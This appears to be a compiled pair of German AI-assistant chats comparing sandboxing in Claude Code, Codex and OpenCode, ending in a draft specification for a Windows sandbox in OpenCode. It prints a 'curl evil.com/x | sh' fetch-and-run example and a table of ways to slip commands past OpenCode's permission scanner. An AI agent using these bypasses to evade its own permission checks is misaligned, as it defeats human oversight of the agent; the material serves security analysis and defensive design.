# Claude & Codex mit Sandboxing versus OpenCode mit Berechtigungsprüfungen

**BraveAI, 15.11.2026

*User: 
Kontext: Agenten-Harness für LLM.
Verbreitete Programme sind Claude Code, Codex und OpenCode. Die ersten beiden verfügen über eine Sandbox zur Abschirmung zwischen Arbeitsverzeichnis und Betriebssystem, OpenCode dagegen nicht.
Codex und OpenCode sind beides OpenSource Programme mit Quellcode bei GitHub.

Frage: Warum hat man sich bei der Entwicklung von OpenCode als Softwarearchitektur-Entscheidung gegen das Konzept mit einer Sandbox entschieden, obwohl diese mehr Sicherheit bringt?

*BraveAI:
Die Entscheidung gegen eine OS-Sandbox bei OpenCode folgt aus dessen zentralem Designprinzip: **maximale Portabilität und Modellneutralität bei minimaler Abhängigkeit**. Konkret:

1. **Reine TypeScript/Node.js-Architektur ohne Native-Abhängigkeiten.** Eine Kernel-Sandbox erfordert plattformspezifischen Code (Seatbelt auf macOS, bubblewrap + seccomp auf Linux, eine eigene Implementierung auf Windows – wie Codex zeigen muss). OpenCode läuft als reines Node.js-Paket überall, ohne solche Bindings.

2. **Modell- und Provider-Neutralität.** OpenCode priorisiert „kann ich jedes Modell überall ausführen, ohne jemanden um Erlaubnis zu bitten". Eine vorgebaute Sandbox-Policy wäre eine Meinungsäußerung über den Betriebskontext – genau das, was das Projekt bewusst vermeidet.

3. **Unix-Philosophie: Kontrolle beim Nutzer.** Statt einer voreingestellten Sandbox setzt OpenCode auf **in-process-Berechtigungsprüfungen** (AST-Parsing von Shell-Befehlen via tree-sitter, last-matching-rule-wins, Default: ask). Der Nutzer entscheidet, welche Berechtigungen gelten – ohne opinionated Pre-Loaded Policies.

4. **Komplementär, nicht ersetzend.** Das Berechtigungssystem an der Tool-Call-Grenze ist explizit *ergänzend* zu OS-Sandboxes gedacht. Wer Kernel-Isolation braucht, kann OpenCode selbst in Docker, Firecracker oder bubblewrap ausführen – das Harness erzwingt keine bestimmte Laufzeitumgebung.

Kurz: Die Sandbox würde die Plattformunabhängigkeit und Nutzerkontrolle, die OpenCode als Kernversprechen hat, mit plattformspezifischem Overhead und vorgefassten Policies eintauschen.

Links:
https://arceapps.com/blog/deepseek-harness-vs-opencode-codex-claude-code/
https://dheerajakula.dev/blog/what-is-an-agent-harness-claude-code-codex-opencode
https://github.com/anomalyco/opencode/issues/2242

----
*User:
Ganz überzeugt mich das nicht. Antropic/Claude Coder und OpenAI/Codex haben ja auch Lösungen für das Sandboxing in verschiedenen Umgebungen gefunden. Es ist natürlich aufwendig, aber geht. 

Erzähle mir mehr über die Sicherheitskonzepte und Umsetzung bei OpenCode: "in-process-Berechtigungsprüfungen (AST-Parsing von Shell-Befehlen via tree-sitter, last-matching-rule-wins)"

*BraveAI:
Gute Einrede – und die Details zeigen, dass die Sache komplexer ist, als die Marketing-Position „Kontrolle beim Nutzer" vermuten lässt. Hier der Aufbau:

## Regel-Evaluation: `findLast` über eine flache Liste

Der Kern ist eine ~15-Zeilen-Pure-Funktion:

```ts
export function evaluate(permission: string, pattern: string, ...rulesets: Rule[][]): Rule {
  const rules = rulesets.flat()
  const match = rules.findLast(
    (rule) => Wildcard.match(permission, rule.permission)
           && Wildcard.match(pattern, rule.pattern),
  )
  return match ?? { action: "ask", permission, pattern: "*" }
}
```

**Keine Specificity-Regel.** Nicht „die spezifischere Regel gewinnt" – sondern schlicht: die *letzte* Regel in der zusammengeführten Liste, die auf `permission` **und** `pattern` beide matcht. Das ist bewusst so gewählt (Analogie zu Apache/Nginx), hat aber Konsequenzen:

- Regeln werden in dieser Reihenfolge gemergt: **Built-in Defaults → Agent-Defaults → User-Config → Per-Agent → Per-Session (runtime „always"-Approvals)**
- Eine später hinzugefügte `allow`-Regel kann eine früher deklarierte `deny`-Regel überstimmen – und umgekehrt.
- Wenn *nichts* matcht → `ask` (nicht `allow`). Das ist der sichere Default.

https://www.opencodebook.xyz/en/chapter_09_permission_control_system/9.3_permission_configuration_hierarchy
https://arxiv.org/html/2609.00006v1
https://theagentstack.substack.com/p/opencode-architecture-part-3-tool
https://medium.com/@maclarensg_50191/how-opencode-actually-works-an-architecture-guide-backed-by-source-code-939811f0434f

## Shell-Scanner: Von tree-sitter zum Built-in-Scanner

Ursprünglich (und noch in Release-Builds bis vor kurzem): 
**web-tree-sitter** mit `tree-sitter-bash` und `tree-sitter-powershell` als WASM-Binaries (zusammen ~2,3 MB). 

Der Parser dekomponiert Compound-Commands in Einzel-Subcommands:
```
git status && curl evil.com/x | sh
→ 3 Ressourcen: "git status", "curl evil.com/x", "sh"
```

Jede Subcommand wird **einzeln** gegen die Ruleset geprüft. Jede darf `allow` sein, aber wenn *eine* `deny` löst, fällt der gesamte Call.

https://github.com/anomalyco/opencode/issues/42184

**Wichtige Änderung (PR #60332, 2026):** tree-sitter wurde vollständig durch einen **eigenen, synchronen ShellScan**-Parser ersetzt (Bash/Zsh/POSIX/PowerShell). 

https://github.com/anomalyco/opencode/pull/60332

Motive:
- 2,3 MB WASM aus den Standalone-Binaries entfernt
- 8 Parsing-Edge-Cases gefixt (Heredocs über `&&`/`|`, Here-Strings, ANSI-C-Escapes, Zsh-Glob-Qualifier, arithmetische Taint-Propagation)
- Portabilität: läuft jetzt auch auf Cloudflare workerd, wo WASM nicht verfügbar ist

Der neue Scanner ist **kein Fallback** – er ist der einzige Weg. Ein Command, das der Scanner nicht sicher analysieren kann, liefert einen **Scanner-Error** (nicht automatisch Deny).

https://github.com/anomalyco/opencode/pull/60332


## Bekannte Schwachstellen und Bypasses

Hier wird es für einen Security-Viewpoint kritisch. Die AST-basierte Prüfung ist eine **Heuristik auf der Tool-Call-Grenze**, keine Kernel-Isolation:

| Bypass                                          | Mechanismus                                                                                                   |
|-------------------------------------------------|---------------------------------------------------------------------------------------------------------------|
| `echo 'git clean -fdx .' \| bash`               | Der Scanner sieht nur `echo` und `bash` – der *Inhalt* des Strings wird nicht als Subcommand dekomponiert     |
| `rm -rf x` vs `/bin/rm -rf x` vs `env rm -rf x` | Pattern-Matching ist **spelling-dependent**; eine `deny` für `rm *` fängt nicht `/bin/rm *`                   |
| `--` in PowerShell                              | Parser liefert `patterns.size === 0` → Permission-Check wird **komplett übersprungen** (Issue #54393, #60438) |
| `timeout 30 rm -rf x`                           | Wrapper-Builtins werden nicht durchschaut (Plugin `shell-unwrap` existiert als Workaround)                    |
| `cd -- -/../../../etc`                          | Path-Traversal über `cd`-Flags wurde in älteren Versionen nicht erkannt (fixt in ShellScan)                   |

Das dritte Problem ist besonders heikel: **Parse-Fehler führen zu *keinem* Check**, nicht zu Deny. Das ist ein Fail-Open-Verhalten.

## Was das Konzept *nicht* ist

- **Kein Capability-System im OS-Sinn.** 
  Der Prozess läuft mit den vollen Rechten des Host-Nutzers (Dateisystem, Prozesse, Netzwerk). 
  Die Permission-Engine ist eine *Gatekeeper-Schicht im Node.js-Prozess*, die vor dem `child_process.spawn()` greift.
- **Keine Isolation bei Malicious Model Output.** 
  Wenn das LLM einen String erzeugt, der den Scanner umgeht (z. B. obfuziert), greift nichts darunter.
- **Keine Audit-Trail-Garantie.** 
  „Always"-Approvals werden pro-Session in SQLite persistiert, aber die Entscheidung *warum* ein Command erlaubt wurde, ist nicht nachvollziehbar wie ein Sandbox-Violation-Log.

## Fazit

Die Architektur ist eine **best-effort-Heuristik an der Tool-Call-Grenze** mit bewusstem Trade-off: maximale Portabilität und Nutzerkontrolle gegen eine formale Sicherheitsgarantie. 
Die Bypasses sind dokumentiert, teilweise noch offen (PowerShell `--`), und das Fail-Open-Verhalten bei Parse-Errors ist ein echtes Risiko. 
Wer Kernel-Isolation braucht, muss OpenCode selbst in Docker/Firecracker/bubblewrap einbetten – das Harness selbst liefert das nicht.

https://github.com/anomalyco/opencode/issues/60438

=============
# die gleiche Frage in Duck.ai; Modell: Claude-Haiku-5.5

*User:
Kontext: Agenten-Harness für LLM.
Verbreitete Programme sind `Claude Code`, `Codex` und `OpenCode`. 
Die ersten beiden verfügen über eine Sandbox zur Abschirmung zwischen Arbeitsverzeichnis und Betriebssystem, *OpenCode* dagegen nicht (und Claude Code auch nicht unter Windows).
Codex und OpenCode sind beides OpenSource Programme mit Quellcode bei GitHub.

Frage: Warum hat man sich bei der Entwicklung von OpenCode als Softwarearchitektur-Entscheidung gegen das Konzept mit einer Sandbox entschieden, obwohl diese mehr Sicherheit bringt?

*DDG:
Ich prüfe kurz die Dokumentation und die Projektquellen, ob OpenCode eine offizielle Begründung für diesen Verzicht nennt.
OpenCode hat sich nicht grundsätzlich gegen eine Sandbox entschieden. 
**Das Projekt setzte bisher auf ein Berechtigungssystem statt auf Isolation, und seit April 2026 gibt es eine experimentelle Sandbox, die allerdings nur unter macOS läuft.** 
Ihre Prämisse stimmt also nicht mehr ganz: OpenCode hatte zwar lange keine Sandbox, inzwischen aber einen Anfang.

| Agent       | Sandbox-Status                                                 | Technik                                           | Plattformen                               |
|-------------|----------------------------------------------------------------|---------------------------------------------------|-------------------------------------------|
| Claude Code | Nativ verfügbar, für Bash-Befehle, per `/sandbox` aktivierbar  | Seatbelt (macOS), bubblewrap (Linux/WSL2)         | macOS, Linux, WSL2, kein natives Windows  |
| Codex       | Standardmäßig aktiv, Schreibzugriff auf den Workspace begrenzt | Seatbelt (macOS), bwrap plus seccomp (Linux/WSL2) | macOS, Linux, WSL2, Windows experimentell |
| OpenCode    | Experimentell und opt-in seit April 2026, nur Bash-Befehle     | Seatbelt über sandbox-exec                        | nur macOS                                 |

### Das Designverständnis von OpenCode

In der Sicherheitsdokumentation des Projekts heißt es sinngemäß, OpenCode sandboxe den Agenten nicht. Das Berechtigungssystem sei eine UX-Funktion, damit Nutzer nachvollziehen, welche Aktionen der Agent ausführt. Es sei ausdrücklich nicht für Sicherheitsisolation gedacht, und wer echte Isolation brauche, solle OpenCode in einem Docker-Container oder einer VM betreiben. <citation src="1"></citation>

https://github.com/DEVtheOPS/opencode/Security-Viewpoint

Eine offizielle Begründung im Sinne eines Architekturentscheids habe ich nicht gefunden. 
Aus dem Design und den Dokumenten lassen sich aber mehrere plausible Gründe ableiten, die ich als meine Einschätzung und nicht als Projektaussage verstehe:

- **Human-in-the-loop als Leitprinzip:** 
  Der Entwickler soll jeden kritischen Schritt sehen und freigeben können. 
  Das ist ein bewusst anderes Modell als die kernelseitige Begrenzung, bei der der Nutzer Vorgaben nur einmal setzt.
- **Plattformunabhängigkeit:** 
  OS-Sandboxen sind plattformspezifisch (Seatbelt, bubblewrap, seccomp, Windows-Token). Ein Projekt, das auf allen Systemen laufen soll, muss diese Vielfalt pflegen.
- **Kompatibilität mit Entwicklerwerkzeugen:** 
  Eine strenge Sandbox kollidiert schnell mit Netzwerkzugriffen für Paketmanager, Git-Remotes, Docker, lokale Dienste oder MCP-Server. 
  Jede Ausnahme schwächt die Schutzwirkung wieder.
- **Begrenzte Reichweite:** 
  Eine Sandbox für Shell-Befehle erfasst nicht alles. Die Dateioperationen des Agenten selbst laufen im eigenen Prozess, und MCP-Server liegen außerhalb. 
  Die Abschirmung wirkt also nur auf einen Teil der Aktionen.
- **Verlagerung auf Container oder VM:** 
  Wer echte Isolation will, kann sie außerhalb des Programms herstellen. Das hält den Agenten schlank.

### Die Schwächen dieses Ansatzes

Das Modell hat reale Nachteile. Die meisten Werkzeuge sind standardmäßig erlaubt, und die Regel `*` auf `allow` ist die Grundlage der Standardrichtlinie. 
<citation src="2"></citation> Freigaben im Modus „always“ gelten für die laufende Sitzung und werden nirgends zur Prüfung festgehalten. 
<citation src="4"></citation> Außerdem lassen sich Befehlsmuster leicht umgehen, weil eine Zeichenfolge viele Schreibweisen hat. 
Ein Berechtigungsdialog schützt daher nur, solange man tatsächlich mitliest.

https://opencode.ai/docs/permissions/
https://agenticcontrolplane.com/controls/opencode

### Was sich seit April 2026 geändert hat

Die experimentelle Sandbox isoliert Bash-Befehle über Seatbelt, ist aber bisher nur unter macOS verfügbar. MCP-Server sind nicht erfasst, 
und Befehle in einer bereits laufenden interaktiven Shell auch nicht. Über die Option `bash:unsandboxed` darf ein abgelehnter Befehl außerhalb der Sandbox erneut laufen, 
wenn der Nutzer das freigibt. <citation src="5"></citation>

https://terminal.space/ai/permissions-sandboxing-and-undo/

Die Quellen zur Sandbox stammen überwiegend aus Blogbeiträgen. 
Die Entscheidungsgeschichte lässt sich am zuverlässigsten in den Issues und Diskussionen des GitHub-Repositorys nachvollziehen, 
da dort die Designargumente stehen. 
Wofür setzt du den Agenten ein: eher am eigenen Rechner mit Freigaben oder für unbeaufsichtigte Läufe? Davon hängt ab, welcher Ansatz für dich mehr bringt.

*User:
- Nachfrage: Du schreibst bei Claude Code zur Sandbox: "Nativ verfügbar, für Bash-Befehle, per /sandbox aktivierbar" - heisst das, die Sandbox ist nicht standardmäßig aktiviert? 

- "Human-in-the-loop als Leitprinzip" finde ich grundsätzlich gut, aber alle 10 Sekunden eine Berechtigungsanfrage (OpenCode) ist äußerst lästig, 
  lässt weder das Modell zügig arbeiten, noch dem Nutzer Zeit zum Nachdenken. 

- Verlagerung auf Container oder VM prüft aber auch nicht (automatisch), was über MCP-Schnittstellen raus geht und reinkommt. 

- Da Codex auch OpenSource ist und unter Windows mit einer eigenen Sandbox daher kommt (codex-windows-sandbox-service.exe), 
  wäre es auch möglich diese in OpenCode zu integrieren? Wie würde da ein Ansatz aussehen, welche Punkte müssen beachtet werden. 
  Erstelle dafür eine Spezifikation und ein Pflichtenheft.

*Duck.ai
**Nein, die Sandbox von Claude Code ist standardmäßig nicht aktiviert.** 
Der Schalter `enabled` steht auf false und wird über `/sandbox` eingeschaltet. <citation src="1"></citation> 
Meine frühere Formulierung war missverständlich, weil ich „aktivierbar“ nicht klar von „standardmäßig aktiv“ getrennt habe. 
Auch wenn die Sandbox aktiv ist, gibt es Ausweichwege: Startet sie nicht, läuft Claude Code standardmäßig ohne Sandbox weiter und zeigt nur eine Warnung. 
Erst `failIfUnavailable: true` macht daraus einen harten Abbruch. 
Außerdem darf Claude standardmäßig Befehle, die an der Sandbox scheitern, außerhalb ausführen (`allowUnsandboxedCommands` steht auf true). <citation src="1"></citation>

https://github.com/anthropics/claude-code/issues/38557

---

## Zu deinen Punkten

### Berechtigungsanfragen

Du hast recht. Ständige Rückfragen führen dazu, dass man reflexartig bestätigt, und dann ist das Human-in-the-loop-Prinzip wertlos. 
Die bessere Lösung ist, die Prüfung an die Grenze zu verlegen. 
Claude Code macht das mit `autoAllowBashIfSandboxed`, das standardmäßig true ist: Bash-Befehle innerhalb der Sandbox laufen ohne Rückfrage, 
und Freigaben sind nur für Ausbrüche und Grenzfälle nötig. <citation src="1"></citation> 
Der Nutzer legt also einmal fest, welche Pfade und Domains erlaubt sind, und wird nur noch bei tatsächlichen Grenzüberschreitungen gefragt. 
Diese Richtung würde ich auch für OpenCode empfehlen: Policy statt Dialog.


### MCP

Hier stimme ich dir zu, und meine frühere Darstellung war zu knapp. Sandbox und Container begrenzen, worauf ein Prozess zugreifen kann. 
Sie prüfen aber nicht, welche Inhalte über MCP hinausgehen oder hereinkommen, etwa bei Prompt-Injection über Webseiten oder Dateiinhalte. 
Die Sandbox der Shell erfasst MCP-Server nicht. <citation src="5"></citation> 
Claude Code bietet mit dem Sandbox-Runtime-Paket (Beta) eine Umhüllung, die auch MCP-Server einschließt, doch auch dort wird der Inhalt nicht geprüft. 
Für MCP braucht es deshalb eigene Kontrollen: eine Allowlist für Server, ein Gateway mit Protokollprüfung, Egress-Regeln und Credentials, die nicht im Agentenprozess liegen.

https://www.beam.cloud/blog/claude-code-sandbox

---

## Machbarkeit: Codex-Sandbox in OpenCode

**Eine Integration ist machbar, aber keine Drop-in-Lösung.** Die Windows-Sandbox von Codex ist eng mit dem Berechtigungsmodell von Codex verzahnt. 
OpenAI hat sie gebaut, weil Windows keine passende Isolationsprimitive bot. 
AppContainer war zu eng für offene Entwickler-Workflows, Windows Sandbox arbeitet nicht auf dem echten Checkout, 
und Mandatory Integrity Control allein reichte nicht. <citation src="6"></citation>

Zum Dateinamen: In Fehlerberichten taucht `codex-windows-sandbox-setup.exe` auf, einen Dienst namens `...-service.exe` konnte ich nicht bestätigen. <citation src="7"></citation> 
Die Dateinamen solltest du direkt im Repository prüfen.

Codex unterscheidet inzwischen drei Windows-Modi: `mxc` (empfohlen, ohne Administratorfreigabe), `elevated` (Admin-Setup, eigene lokale Benutzer) und 
`unelevated` (Legacy mit schwächerer Netzwerkisolation). <citation src="10"></citation> 
Der elevated-Modus legt die lokalen Benutzer `CodexSandboxOffline` und `CodexSandboxOnline` an, führt Befehle mit eingeschränkten Tokens aus 
und steuert das Netzwerk über Firewallregeln. <citation src="9"></citation>

https://learn.chatgpt.com/docs/windows/windows-sandbox

Für OpenCode (TypeScript) gibt es drei Integrationswege:

- **Variante A, externer Helper:** 
    OpenCode ruft die Sandbox-Binärdatei als Subprozess auf. 
    Das ist am schnellsten umzusetzen, funktioniert nur unter Windows und hängt von Codex-Releases ab.
- **Variante B, native Bibliothek:** 
    Die Logik wird aus dem Rust-Code (Codex nutzt `codex-rs`) als Bibliothek mit Node- oder Bun-Bindings eingebunden. 
    Der Aufwand ist mittel, die Lizenzpflichten müssen vorher geprüft werden.
- **Variante C, Neuimplementierung nach dem Vorbild:** 
    Das bringt volle Kontrolle, aber den höchsten Aufwand und ein eigenes Sicherheitsrisiko.

Mein Vorschlag: zuerst Variante A als Prototyp, dann Variante B, sobald die Anforderungen stabil sind.

---

## Spezifikation

### Ziel und Abgrenzung

Ziel ist eine optionale, standardmäßig aktive Sandbox für die Befehlsausführung von OpenCode unter Windows, die Schreib-, Lese- und Netzwerkzugriffe begrenzt, 
ohne den Arbeitsfluss mit Dialogen zu überfrachten. 
Nicht Ziel sind die Prüfung von MCP-Inhalten, der Schutz vor Schadsoftware auf dem Host und ein vollständiger Ersatz für eine VM.

### Architektur

Die Komponenten sind:

1. **Berechtigungsengine:** 
    die bestehende Regelprüfung von OpenCode, unverändert für Tools außerhalb der Shell.
2. **Sandbox-Controller (TypeScript):** 
    wandelt Tool-Aufrufe in eine Sandbox-Anfrage um und verwaltet die Policy.
3. **Sandbox-Helper (Windows):** 
    führt den Befehl unter eingeschränktem Token aus, setzt Dateisystem- und Netzregeln durch.
4. **Policy-Datei:** 
    definiert erlaubte Pfade, Domains und Ausnahmen, mit Vorrang für eine verwaltete Ebene.
5. **Audit-Log:** 
    protokolliert Befehl, Entscheidung, Verstöße und Sandbox-Status.

Der Ablauf ist: Tool-Aufruf, Berechtigungsprüfung, Einhüllung in die Sandbox, Ausführung, Protokollierung.

### Plattformen

| Plattform          | Umsetzung                                   |Priorität| Anmerkung                                                       |
|--------------------|---------------------------------------------|---------|-----------------------------------------------------------------|
| Windows 11         | `mxc`, Fallback `elevated`                  | Hoch    | Empfohlene Basis, mxc ohne Admin-Setup                          |
| Windows 10 (1809+) | `elevated`                                  | Mittel  | Best effort, ConPTY erforderlich <citation src="10"></citation> |
| WSL2               | Linux-Sandbox                               | Mittel  | Eigener Pfad, nicht Teil der Windows-Umsetzung                  |
| macOS              | Seatbelt, bestehende experimentelle Sandbox | Niedrig | Vorhanden, nur harmonisieren                                    |
| Linux              | bubblewrap oder seccomp                     | Niedrig | Vorhanden, nur harmonisieren                                    |

---

## Pflichtenheft

### Funktionale Anforderungen

| ID    | Anforderung                                                                           | Prio | Abnahmekriterium                                               |
|-------|---------------------------------------------------------------------------------------|------|----------------------------------------------------------------|
| FA-01 | Befehle aus dem Shell-Tool laufen in der Sandbox, wenn sie aktiv ist                  | Muss | Ein Testbefehl läuft nachweislich eingeschränkt                |
| FA-02 | Schreibzugriff nur auf das Workspace und explizit freigegebene Pfade                  | Muss | Schreiben nach `C:\Windows` schlägt fehl                       |
| FA-03 | Lesezugriff auf Credentials blockiert (z. B. `.ssh`, Credential-Stores, `.env`)       | Muss | Lesen von `%USERPROFILE%\.ssh` schlägt fehl                    |
| FA-04 | Netzwerk standardmäßig gesperrt, Allowlist pro Domain und Port                        | Muss | Zugriff auf eine nicht gelistete Domain wird blockiert         |
| FA-05 | Git-Konfiguration und Hooks sind vor Agentenschreibzugriff geschützt                  | Muss | Schreiben nach `.git/hooks` wird verweigert oder protokolliert |
| FA-06 | Fail-closed: Ist die Sandbox nicht startbar, wird der Befehl verweigert               | Muss | Kein stiller Fallback ohne Sandbox                             |
| FA-07 | Ausbruch (unsandboxed) nur nach expliziter Freigabe                                   | Muss | Standard ist deaktiviert                                       |
| FA-08 | Auto-Allow innerhalb der Sandbox, Rückfragen nur bei Grenzüberschreitung              | Soll | Anzahl der Dialoge bei Routinearbeit sinkt deutlich            |
| FA-09 | Audit-Log für Befehle, Entscheidungen und Verstöße                                    | Soll | Log ist nachvollziehbar und ohne Secrets                       |
| FA-10 | Konfiguration auf Projekt-, Benutzer- und Managed-Ebene mit Vorrang für Managed       | Soll | Managed-Regel lässt sich nicht überschreiben                   |
| FA-11 | Sandbox-Status in der Oberfläche sichtbar                                             | Soll | Status wird angezeigt                                          |
| FA-12 | Konfigurationsdateien von OpenCode und Hooks sind vor Agentenschreibzugriff geschützt | Muss | Agent kann die eigene Policy nicht ändern                      |
| FA-13 | Setup ohne Administratorrechte bevorzugt                                              | Soll | mxc-Pfad ohne UAC                                              |

### Nicht-funktionale Anforderungen

| ID     | Anforderung                                             | Abnahmekriterium                                          |
|--------|---------------------------------------------------------|-----------------------------------------------------------|
| NFA-01 | Zusätzliche Latenz pro Befehl                           | Zielwert unter 100 ms, gemessen                           |
| NFA-02 | Kompatibilität mit Git, npm, pip, dotnet und Docker-CLI | Testsuite besteht, Docker-Socket nur explizit freigegeben |
| NFA-03 | Unabhängiges Sicherheitsreview vor Release              | Befund dokumentiert, kritische Punkte behoben             |
| NFA-04 | Lizenz- und Notice-Konformität des übernommenen Codes   | Rechtliche Prüfung abgeschlossen                          |
| NFA-05 | Signierte Helper-Binärdatei                             | Signatur wird vor Start geprüft                           |
| NFA-06 | Keine Übertragung von Pfaden oder Logs ohne Opt-in      | Telemetrie ist standardmäßig aus                          |
| NFA-07 | Versionierter Helper mit geprüftem Update-Pfad          | Versionsabgleich bei jedem Start                          |

### Bekannte Risiken

Die Windows-Sandbox von Codex hat dokumentierte Schwachstellen, die man übernehmen würde. Ordner, die `Everyone` beschreibbar sind, 
lassen sich nicht vollständig schützen. <citation src="10"></citation> Die Microsoft-Store-Version von PowerShell kann für die Sandbox unzugänglich sein, 
weshalb die MSI-Version empfohlen wird. <citation src="8"></citation> Zudem gibt es Startfehler des Setup-Helpers in Codex-Issues. <citation src="7"></citation> 
Diese Punkte sollten in Testfälle übernommen werden.

https://learn.chatgpt.com/docs/windows/windows-sandbox
https://community.openai.com/t/codex-tip-setting-up-your-windows-native-sandbox-to-reduce-auto-review-requests/1388800
https://github.com/openai/codex/discussions/6065


### Offene Entscheidungen

Offen sind die Frage, ob der Helper als Dienst oder bei Bedarf läuft, ob die Netzwerkpolicy im Helper oder im Controller durchgesetzt wird 
und wie Ausnahmen für Docker oder lokale Dienste behandelt werden.

Für welche Umgebung planst du das: den eigenen Windows-Entwicklerrechner oder eine Umgebung mit mehreren Nutzern und verwalteten Richtlinien? 
Davon hängt ab, ob `mxc` ausreicht oder ob du Managed-Policies und Admin-Setup brauchst.

https://openai.com/index/building-codex-windows-sandbox/

----
*User:
- Auf den Befehl /sandbox in Claude Code bekomme ich die Rückmeldung: "Error: Sandboxing is currently only supported on macOS, Linux, and WSL2." (ich arbeite unter Windows 11). 
Also gibt es unter Windows doch keine Sandbox für Claude Code? 

- Die Umsetzung der Einbindung der Codex-Sandbox für OpenCode plane ich für Windows 11.

*Duck.ai
**Ja, unter nativem Windows 11 gibt es für Claude Code keine Sandbox.** 
Die Fehlermeldung ist eindeutig: Sandboxing wird nur unter macOS, Linux und WSL2 unterstützt. Meine erste Tabelle nannte das zwar mit „kein natives Windows“, 
ich habe es aber in den folgenden Antworten nicht deutlich genug hervorgehoben.

Die realistische Option ist, **Claude Code innerhalb von WSL2** zu betreiben. Dort läuft die Sandbox mit Linux-Mechanismen, und sie ist dann auch aktivierbar. 
Zwei Punkte solltest du dabei beachten. Erstens schützt die Sandbox nur den Linux-Bereich. Auf Windows-Dateien unter `/mnt/c` gelten die Sandbox-Regeln, 
aber der Zugriff ist langsamer, und du musst die Pfade bewusst freigeben. 
Zweitens hat Claude Code dann keinen Zugriff auf deine nativen Windows-Werkzeuge, wenn du sie nicht zusätzlich einbindest.

| Weg für CC unter Windows 11 | Sandbox    | Aufwand           | Anmerkung                                     |
|-----------------------------|---------------------|-------------------|-----------------------------------------------|
| Nativ (PowerShell oder CMD) | Nein                | Keiner            | Nur Berechtigungsregeln, keine Isolation      |
| In WSL2                     | Ja, Linux-Sandbox   | Gering bis mittel | Projekt am besten im Linux-Dateisystem halten |
| In Container oder VM        | Ja, über Hostmittel | Mittel            | Mehr Isolation, aber mehr Pflege              |

Für deine Pläne zu OpenCode ist das eine gute Nachricht, weil die Windows-Sandbox von Codex genau die Lücke schließt, die Claude Code unter Windows hat. 

Für das Pflichtenheft bedeutet das:
- **Priorität Windows 11:** 
    Die Zielplattform ist Windows 11, und der Modus `mxc` (ohne Administratorfreigabe) wird der Standard. 
    Der Modus `elevated` bleibt als Fallback für Fälle, in denen `mxc` nicht genügt.
- **Windows 10 streichen:** 
    Der Eintrag „Best effort“ für Windows 10 sollte aus dem Umfang heraus, damit du dich auf eine Plattform konzentrieren kannst. 
    Die Anforderung zu ConPTY habe ich dort nicht sauber belegt, daher solltest du sie vor einer Übernahme prüfen.
- **Vergleichsmaßstab:** 
    Claude Code unter WSL2 ist ein sinnvoller Referenzpunkt für das Verhalten einer Linux-Sandbox. 
    Die Windows-Umsetzung für OpenCode muss dagegen eigenständig getestet werden, weil es dort kein vergleichbares Gegenstück gibt.

Willst du OpenCode primär nativ unter Windows nutzen oder ebenfalls über WSL2? Davon hängt ab, ob die Windows-Helper-Variante überhaupt die Hauptlast tragen muss.
